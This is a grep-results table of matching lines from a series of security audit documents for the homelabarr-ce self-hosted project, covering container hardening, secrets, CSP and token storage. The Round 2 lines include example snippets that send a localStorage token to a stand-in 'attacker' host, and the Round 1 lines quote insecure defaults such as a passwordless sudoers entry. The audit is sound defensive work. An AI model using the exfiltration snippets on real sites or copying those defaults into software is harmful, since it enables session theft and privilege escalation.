| `docs/audit/R19-runtime-contract-build-time.md` | 4 | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R19-runtime-contract-build-time.md` | 5 | `> **Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R19-runtime-contract-build-time.md` | 14 | `Live (ce-demo.homelabarr.com, cache-busted, credentials:'omit'):` |
| `docs/audit/R19-runtime-contract-build-time.md` | 48 | `Audit the runtime contract the homelabarr-ce containers ship with. Specifically:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 51 | `2. Runtime hardening (homelabarr.yml): image pinning, capability surface, network egress, secret material handling, watc` |
| `docs/audit/R19-runtime-contract-build-time.md` | 60 | `The shipped 'homelabarr.yml' is **already substantially hardened**. Inventory of controls already present (do not regres` |
| `docs/audit/R19-runtime-contract-build-time.md` | 65 | `- 'security_opt: [apparmor=homelabarr-backend, no-new-privileges:true]' — custom AppArmor profile referenced` |
| `docs/audit/R19-runtime-contract-build-time.md` | 81 | `- 'homelabarr' (external bridge) and 'homelabarr-internal' ('internal: true' — no external connectivity)` |
| `docs/audit/R19-runtime-contract-build-time.md` | 98 | `**Drift between deploy-pipeline/INFRASTRUCTURE.md and shipped homelabarr.yml:** the deploy doc says CE backend "Docker s` |
| `docs/audit/R19-runtime-contract-build-time.md` | 107 | `**Surface:** ce-prod VM 121 vs homelabarr.yml in repo` |
| `docs/audit/R19-runtime-contract-build-time.md` | 108 | `**Why it matters:** A pentester or auditor who reads the public homelabarr.yml will conclude the Docker socket is :ro be` |
| `docs/audit/R19-runtime-contract-build-time.md` | 114 | `docker inspect homelabarr-backend --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} (rw={{.RW}}){{"\n"}}{{end}}` |
| `docs/audit/R19-runtime-contract-build-time.md` | 115 | `docker inspect homelabarr-backend --format '{{.HostConfig.SecurityOpt}} {{.HostConfig.CapDrop}} {{.HostConfig.ReadonlyRo` |
| `docs/audit/R19-runtime-contract-build-time.md` | 116 | `docker inspect homelabarr-backend --format '{{json .Config.Env}}' \| grep -iE 'DOCKER_HOST\|CLI_BRIDGE' \|\| echo "no DO` |
| `docs/audit/R19-runtime-contract-build-time.md` | 117 | `docker ps --filter name=homelabarr-socket-proxy --format '{{.Names}} {{.Status}}'` |
| `docs/audit/R19-runtime-contract-build-time.md` | 120 | `2. Compare to homelabarr.yml in this repo:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 121 | `- Mounts: backend should have NO docker.sock mount, only '/homelabarr:ro', 'homelabarr-data', 'homelabarr-config', 'home` |
| `docs/audit/R19-runtime-contract-build-time.md` | 124 | `- SecurityOpt should include 'apparmor=homelabarr-backend' and 'no-new-privileges:true'` |
| `docs/audit/R19-runtime-contract-build-time.md` | 136 | `**Surface:** Dockerfile, Dockerfile.backend, homelabarr.yml` |
| `docs/audit/R19-runtime-contract-build-time.md` | 161 | `2. homelabarr.yml — pin every 'image:' line by digest, OR document a verification step that downstream operators can r` |
| `docs/audit/R19-runtime-contract-build-time.md` | 163 | `The harder version (digest in compose): every 'image:' becomes 'image: ghcr.io/.../homelabarr-backend:latest@sha256:<dig` |
| `docs/audit/R19-runtime-contract-build-time.md` | 165 | `The pragmatic version (signature verification at pull time): keep ':latest' for the homelabarr-* images, but add a '# ve` |
| `docs/audit/R19-runtime-contract-build-time.md` | 205 | `**Surface:** homelabarr.yml backend env block` |
| `docs/audit/R19-runtime-contract-build-time.md` | 208 | `**FIX:** Add an inline comment in homelabarr.yml above the env block:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 221 | `### M-2 — Watchtower opt-in label is absent from the shipped homelabarr.yml` |
| `docs/audit/R19-runtime-contract-build-time.md` | 224 | `**Surface:** homelabarr.yml — no 'com.centurylinklabs.watchtower.enable=true' label on any service` |
| `docs/audit/R19-runtime-contract-build-time.md` | 225 | `**Why it matters:** Per the deploy-pipeline doc (read with permission), the production fleet runs Watchtower in LABEL_EN` |
| `docs/audit/R19-runtime-contract-build-time.md` | 229 | `**Option A (recommended for self-hosters):** ship the compose WITHOUT watchtower labels. Add a comment block in homelaba` |
| `docs/audit/R19-runtime-contract-build-time.md` | 249 | `**Surface:** homelabarr.yml — frontend service` |
| `docs/audit/R19-runtime-contract-build-time.md` | 250 | `**Why it matters:** The backend service was deeply inspected. The frontend ('ghcr.io/imogenlabs/homelabarr-frontend:late` |
| `docs/audit/R19-runtime-contract-build-time.md` | 252 | `**FIX:** Agent reads homelabarr.yml frontend block and confirms the same set as backend: cap_drop ALL, security_opt no-n` |
| `docs/audit/R19-runtime-contract-build-time.md` | 288 | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -E '^FROM ' \|\| echo "no FROM li` |
| `docs/audit/R19-runtime-contract-build-time.md` | 295 | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -E '(ENTRYPOINT\|dumb-init\|tini)` |
| `docs/audit/R19-runtime-contract-build-time.md` | 300 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -E '(linuxserver/socket` |
| `docs/audit/R19-runtime-contract-build-time.md` | 304 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -iE 'watchtower' \| hea` |
| `docs/audit/R19-runtime-contract-build-time.md` | 308 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -B 2 'BIND_ADDRESS'` |
| `docs/audit/R19-runtime-contract-build-time.md` | 312 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \` |
| `docs/audit/R19-runtime-contract-build-time.md` | 320 | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/.dockerignore \| grep -qF "$entry" && echo "` |
| `docs/audit/R19-runtime-contract-build-time.md` | 351 | `- **H-1 reconciliation:** run the docker inspect on ce-prod, compare to shipped homelabarr.yml, and decide which to alig` |
| `docs/audit/R20-secret-material-handling.md` | 4 | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R20-secret-material-handling.md` | 54 | `**Surface:** server/auth.js, scripts/rotate-jwt-key.sh, homelabarr.yml secrets block` |
| `docs/audit/R20-secret-material-handling.md` | 56 | `- 'homelabarr.yml' mounts 'jwt_key_previous' as a secret file.` |
| `docs/audit/R20-secret-material-handling.md` | 223 | `**Why it matters:** 'const body = JSON.stringify({ ...payload, source: 'homelabarr-ce', ts: ... })'. The payload object ` |
| `docs/audit/R20-secret-material-handling.md` | 230 | `const body = JSON.stringify({ ...safe, source: 'homelabarr-ce', ts: new Date().toISOString() });` |
| `docs/audit/R20-secret-material-handling.md` | 246 | `  \|\| Buffer.from(hkdfSync('sha256', JWT_SECRET, Buffer.alloc(0), 'homelabarr-api-key-hmac/v1', 32)).toString('hex');` |
| `docs/audit/R20-secret-material-handling.md` | 311 | `**Surface:** homelabarr.yml, scripts/check-secret-age.sh` |
| `docs/audit/R20-secret-material-handling.md` | 336 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/auth.js \` |
| `docs/audit/R20-secret-material-handling.md` | 341 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/auth.js \` |
| `docs/audit/R20-secret-material-handling.md` | 346 | `DOC=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/SECURITY.md)` |
| `docs/audit/R20-secret-material-handling.md` | 347 | `CODE=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/auth.js)` |
| `docs/audit/R20-secret-material-handling.md` | 353 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/secrets.js \` |
| `docs/audit/R20-secret-material-handling.md` | 358 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/alert.js \` |
| `docs/audit/R20-secret-material-handling.md` | 363 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/alert.js \` |
| `docs/audit/R20-secret-material-handling.md` | 368 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/alert.js \` |
| `docs/audit/R20-secret-material-handling.md` | 373 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/index.js \` |
| `docs/audit/R20-secret-material-handling.md` | 378 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/db.js \` |
| `docs/audit/R20-secret-material-handling.md` | 383 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/.eslintrc.json \` |
| `docs/audit/R20-secret-material-handling.md` | 385 | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/eslint.config.js \` |
| `docs/audit/R20-secret-material-handling.md` | 398 | `bash /opt/homelabarr/scripts/rotate-jwt-key.sh` |
| `docs/audit/R20-secret-material-handling.md` | 403 | `grep key.rotation.detected /var/log/homelabarr/audit.log` |
| `docs/audit/R21-error-surface-hygiene.md` | 4 | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R21-error-surface-hygiene.md` | 14 | `**Live (ce-demo.homelabarr.com, cache-busted, credentials:'omit'):**` |
| `docs/audit/R21-error-surface-hygiene.md` | 126 | `Verification: 'curl -X POST -H 'Content-Type: application/json' -d 'not-json' https://ce-demo.homelabarr.com/api/auth/lo` |
| `docs/audit/R21-error-surface-hygiene.md` | 390 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R21-error-surface-hygiene.md` | 429 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/index.js \` |
| `docs/audit/R21-error-surface-hygiene.md` | 435 | `  COUNT=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -cE 'console\.(log\|error` |
| `docs/audit/R22-owner-closeout.md` | 5 | `**Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R22-owner-closeout.md` | 7 | `**Live target:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R22-owner-closeout.md` | 15 | `R21 ("error surface hygiene") was delivered, shipped, and is now verified live. Below is the verification battery result` |
| `docs/audit/R22-owner-closeout.md` | 40 | `Live response from 'https://ce-demo.homelabarr.com/health' still returns` |
| `docs/audit/R22-owner-closeout.md` | 50 | `'curl -sI https://ce-demo.homelabarr.com/health \| grep -i content-type' should show` |
| `docs/audit/R22-owner-closeout.md` | 59 | `R22 is the **final round** of the 22-round security audit loop on 'homelabarr-ce'. This round does not introduce new fin` |
| `docs/audit/R22-owner-closeout.md` | 69 | `A prospect arriving today at 'github.com/imogenlabs/homelabarr-ce' will see:` |
| `docs/audit/R22-owner-closeout.md` | 71 | `- A README with no obvious dead links, a SECURITY.md, CODE_OF_CONDUCT, CONTRIBUTING, an MIT LICENSE, threat model in 'do` |
| `docs/audit/R22-owner-closeout.md` | 97 | `**Recommended:** Block 60 min, read it cold, sign the bottom ('smashingtags, 2026-MM-DD'), commit. If anything in it sur` |
| `docs/audit/R22-owner-closeout.md` | 110 | `**What's blocking:** Private repo doc 'deploy-pipeline/INFRASTRUCTURE.md' describes the production compose stack with de` |
| `docs/audit/R22-owner-closeout.md` | 113 | `**Recommended:** Hand the agent: "reconcile 'INFRASTRUCTURE.md' against current 'homelabarr.yml' at 'smashingtags/homela` |
| `docs/audit/R22-owner-closeout.md` | 129 | `**Recommended:** Agent rebuild + redeploy nginx image, then re-probe 'curl -sI https://ce-demo.homelabarr.com/health' an` |
| `docs/audit/R22-owner-closeout.md` | 221 | `After Sprint 1 + Sprint 2 + Sprint 3 ship, every funnel-credibility-blocking item is closed and the homelabarr-ce repo w` |
| `docs/audit/R22.5-unauth-route-gating.md` | 5 | `**Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R22.5-unauth-route-gating.md` | 7 | `**Live target:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R22.5-unauth-route-gating.md` | 29 | `1. Open a private/incognito browser window with no 'homelabarr-ce' cookies.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 30 | `2. Navigate to 'https://ce-demo.homelabarr.com/'.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 56 | `Verified by reading 'smashingtags/homelabarr-mobile' 'App.tsx' directly.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 58 | `The mobile app ('homelabarr-mobile', public, Expo SDK 55) is a **thin WebView wrapper**. It does not have a native login` |
| `docs/audit/R22.5-unauth-route-gating.md` | 65 | `   window.__HOMELABARR_API_KEY = "<key>";` |
| `docs/audit/R22.5-unauth-route-gating.md` | 93 | `The owner is delegating implementation. The agent has code-write access to 'smashingtags/homelabarr-ce' and 'smashingtag` |
| `docs/audit/R22.5-unauth-route-gating.md` | 95 | `### §3.1 — Server-side changes ('smashingtags/homelabarr-ce')` |
| `docs/audit/R22.5-unauth-route-gating.md` | 102 | `### §3.2 — Frontend changes ('smashingtags/homelabarr-ce', React SPA)` |
| `docs/audit/R22.5-unauth-route-gating.md` | 109 | `### §3.3 — Mobile changes ('smashingtags/homelabarr-mobile')` |
| `docs/audit/R22.5-unauth-route-gating.md` | 150 | `> Quick start: just IP and port 8084. Want a domain name? Deploy Traefik for SSL, or Traefik + Authelia for 2FA. [Config` |
| `docs/audit/R22.5-unauth-route-gating.md` | 154 | `> Got a domain pointed at your server? Open ports 80 and 443, deploy Traefik from the catalog, and HomelabARR handles th` |
| `docs/audit/R22.5-unauth-route-gating.md` | 166 | `> The whole thing. 22 rounds of security audit, threat model, incident response runbook, compliance binders. All in the ` |
| `docs/audit/R22.5-unauth-route-gating.md` | 180 | `\| A1 \| 'curl -sI https://ce-demo.homelabarr.com/' returns '200' with 'Content-Type: text/html', body contains "Sign in` |
| `docs/audit/R22.5-unauth-route-gating.md` | 182 | `\| A3 \| 'curl -sI 'https://ce-demo.homelabarr.com/?_apikey=<valid-key>'' returns '302' to '/' with a 'Set-Cookie' for t` |
| `docs/audit/R22.5-unauth-route-gating.md` | 184 | `\| A5 \| 'curl -sI 'http://ce-demo.homelabarr.com/?_apikey=<any>'' (HTTP, not HTTPS) returns '400' and does not attempt ` |
| `docs/audit/R22.5-unauth-route-gating.md` | 209 | `**Deploy:** ce-demo.homelabarr.com, frontend image 'bdaaa17b6bed', verified live via Playwright` |
| `docs/audit/R22.5-unauth-route-gating.md` | 213 | `The spec proposed a server-side route guard + API key bootstrap endpoint (§3.1, §3.2, Solution A). After reading the m` |
| `docs/audit/R9.7-A-container-stale.md` | 46 | `cd /path/to/homelabarr-ce` |
| `docs/audit/R9.7-A-container-stale.md` | 65 | `Service name is probably 'backend' or 'homelabarr-backend' — adjust to whatever 'docker compose ps' shows.` |
| `docs/audit/R9.7-A-container-stale.md` | 72 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 42 | `  https://ce-demo.homelabarr.com/api/internal/audit` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 89 | `cd /path/to/homelabarr-ce` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 101 | `docker images \| grep homelabarr \| head` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 121 | `docker rmi $(docker images -q 'homelabarr*')` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 132 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 30 | `### Live state (verified just now, cache-busted, ce-demo.homelabarr.com)` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 87 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq .ts` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 89 | `curl -sI https://ce-demo.homelabarr.com/api/health/detail \| head -1` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 90 | `curl -sI https://ce-demo.homelabarr.com/api/_routes \| head -1` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 104 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 181 | `Post-merge verification (run on ce-demo.homelabarr.com):` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 3 | `**Project:** HomelabARR CE ('smashingtags/homelabarr-ce')` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 6 | `**Live target:** 'https://ce-demo.homelabarr.com/' (Cloudflare-fronted)` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 58 | `- 'Dockerfile.backend' — 'USER homelabarr' ✓ but 'homelabarr ALL=(ALL) NOPASSWD: ALL' in '/etc/sudoers'` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 59 | `- 'homelabarr.yml' — 'JWT_SECRET=...:-CHANGE-THIS-TO-A-SECURE-SECRET', 'DEFAULT_ADMIN_PASSWORD=...:-admin', '/var/run/` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 76 | `jwtSecret: process.env.JWT_SECRET \|\| 'homelabarr-default-secret-change-in-production',` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 99 | `**Where:** 'homelabarr.yml' L59, README install script, 'auth.js' initialization` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 106 | `**Impact:** Combined with C-1 and C-8 (no login throttling), an internet-exposed instance using stock 'homelabarr.yml' f` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 109 | `1. Remove the ':-admin' default from 'homelabarr.yml'. Make 'DEFAULT_ADMIN_PASSWORD' required, fail-closed.` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 145 | `RUN addgroup -g 1001 homelabarr && \` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 146 | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr && \` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 147 | `    echo 'homelabarr ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 154 | `RUN addgroup -g 1001 homelabarr && \` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 155 | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 243 | `**Where:** 'homelabarr.yml' L68` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 250 | `1. **Recommended:** Put a [docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy) sidecar in 'homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 330 | `**Impact:** Plaintext key storage = anyone with read access to the 'homelabarr-config' volume gets every API key in clea` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 448 | `**Where:** 'Dockerfile' (frontend) — creates 'homelabarr:1001' user, chowns dirs, but final stage has no 'USER homelab` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 455 | `USER homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 464 | `**Where:** 'homelabarr.yml' L87` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 478 | `Or better: remove the 'ports' block entirely and let the frontend container reach the backend over the internal 'homelab` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 768 | `**Where:** 'homelabarr.yml' — neither service has hardening directives.` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 822 | `### L-31. SECURITY.md and 'homelabarr.yml' disagree on socket mount mode` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 824 | `**Where:** SECURITY.md L53 ("':ro' where possible") vs 'homelabarr.yml' L68 (':rw')` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 842 | `After Rounds 2–N ship, run this from a browser console on 'https://ce-demo.homelabarr.com/':` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 890 | `- 'docker exec homelabarr-backend cat /etc/sudoers \| grep homelabarr' returns nothing` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 891 | `- 'docker exec homelabarr-backend env \| grep -i jwt_secret' shows a non-default value` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 892 | `- 'docker exec homelabarr-backend ls -la /var/run/docker.sock' shows expected GID` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 913 | `- **Decide:** Ship socket-proxy as default in 'homelabarr.yml' (recommended), or keep current behavior and rewrite SECUR` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 936 | `Verified live on 'ce-demo.homelabarr.com' and against 'main' @ 'aa968c3' on 2026-05-22.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 4 | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 5 | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 15 | `Ran the §4 matrix against 'ce-demo.homelabarr.com/?_v=r2verify' with cache-busting. **9 of 11 pass, 1 critical fail, 1 ` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 29 | `\| **'no_jwt_in_localstorage'** \| **true** \| **FALSE — 'homelabarr_token' still written by frontend AuthContext on l` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 48 | `1. Storing the JWT in 'localStorage.homelabarr_token' after login` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 73 | `  const token = localStorage.getItem('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 133 | `  const token = localStorage.getItem('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 196 | `grep -nE 'getAuthHeader\|Authorization\|Bearer\|homelabarr_token' src/` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 269 | `const TOKEN_KEY = 'homelabarr_token';` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 274 | `localStorage.getItem('homelabarr_token')` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 275 | `localStorage.setItem('homelabarr_token', ...)` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 276 | `localStorage.removeItem('homelabarr_token')` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 284 | `  localStorage.removeItem('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 286 | `  Object.keys(localStorage).filter(k => /^homelabarr_(token\|user\|jwt)$/i.test(k)).forEach(k => localStorage.removeItem` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 297 | `**Impact:** Defense-in-depth. Even after the client migrates, a stale browser tab from before deploy still has localStor` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 364 | `curl -s https://ce-demo.homelabarr.com/ \| grep -i mjashley` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 372 | `// Paste in DevTools console on https://ce-demo.homelabarr.com/?_v=r25verify after deploy.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 386 | `    r.bundle_no_homelabarr_token = !js.includes('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 434 | `- 'bundle_no_homelabarr_token' — built bundle has no ''homelabarr_token'' string` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 480 | `  Removes ALL localStorage.{get,set,remove}Item references to 'homelabarr_token'.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 492 | `- Frontend client no longer reads or writes localStorage.homelabarr_token.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 497 | `Verification: §4 of round-2-5 audit MD must pass on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 4 | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 5 | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 15 | `Re-ran Round 1 verification matrix against ce-demo.homelabarr.com with cache-busting:` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 46 | `fetch('//attacker/?t=' + localStorage.getItem('homelabarr_token'))` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 75 | `\| 'src/App.tsx:873,876,877,878' \| static 'href="https://imogenlabs.ai\|wiki.homelabarr.com\|discord.gg/Pc7mXX786x\|git` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 112 | `Live CSP on 'ce-demo.homelabarr.com/' (verified via fetch, cache:'reload'):` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 207 | `const TOKEN_KEY = 'homelabarr_token';` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 273 | `localStorage.getItem('homelabarr_token')  // must be null` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 277 | `new Image().src = '//attacker/?t=' + (localStorage.getItem('homelabarr_token') \|\| 'NONE')` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 289 | `- container Labels ('homelabarr.url', etc.) are not yet a source but are a reasonable future feature` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 383 | `add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; img` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 415 | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i content-security-policy` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 453 | `// Expected: ['https://ce-demo.homelabarr.com/analytics.js']` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 517 | `curl -sI https://ce-demo.homelabarr.com/ \| grep -iE 'reporting-endpoints\|report-to\|report-uri'` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 647 | `Then submit 'homelabarr.com' to https://hstspreload.org/ (manual; owner pile §6).` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 651 | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i strict-transport-security` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 708 | `// Paste into DevTools console on https://ce-demo.homelabarr.com/?_v=r2verify` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 789 | `1. **HSTS preload submission** — submit 'homelabarr.com' (root) to https://hstspreload.org/ once HSTS header satisfies` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 799 | `- All charcode-decoded source spot-checks were re-verified against 'https://github.com/imogenlabs/homelabarr-ce/blob/mai` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 839 | `Verification: §4 of round-2 audit MD must pass all assertions on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 4 | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 5 | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 15 | `Re-ran the R2.5 §4 matrix against 'ce-demo.homelabarr.com/?_v=r25verify' with cache-busting.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 20 | `\| Bundle 'homelabarr_token' count \| 1 (one-shot wipe per spec) \| exactly 1 \| ✅ \|` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 449 | `curl -i --cookie 'hl_session=...; hl_csrf=...' -H 'X-CSRF-Token: ...' -H 'X-Requested-With: XMLHttpRequest' https://ce-d` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 579 | `curl -i -XPOST https://ce-demo.homelabarr.com/api/auth/mfa/setup -H 'Cookie: hl_session=...' -H 'X-Requested-With: XMLHt` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 583 | `curl -i -XPOST https://ce-demo.homelabarr.com/api/auth/login -H 'Content-Type: application/json' -H 'X-Requested-With: X` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 643 | `        from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 676 | `**Demo-mode behavior:** if 'SMTP_HOST' is not set (the case for ce-demo.homelabarr.com), 'forgot-password' returns 204 i` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 782 | `      from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 866 | `// Paste into DevTools on https://ce-demo.homelabarr.com/?_v=r3verify after R3 deploys.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1031 | `Verification: §4 of round-3 audit MD must pass on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main (verified live: ce-demo.homelabarr.com, bundle 'index-pjntRCiX.js')` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 12 | `### Round 3 verification matrix (against 'ce-demo.homelabarr.com/?_v=r3verify', post-deploy bundle 'index-pjntRCiX.js')` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 60 | `### 2.1 — 'homelabarr.yml' (production compose, GHCR images)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 66 | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 67 | `  container_name: homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 78 | `    - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw` |
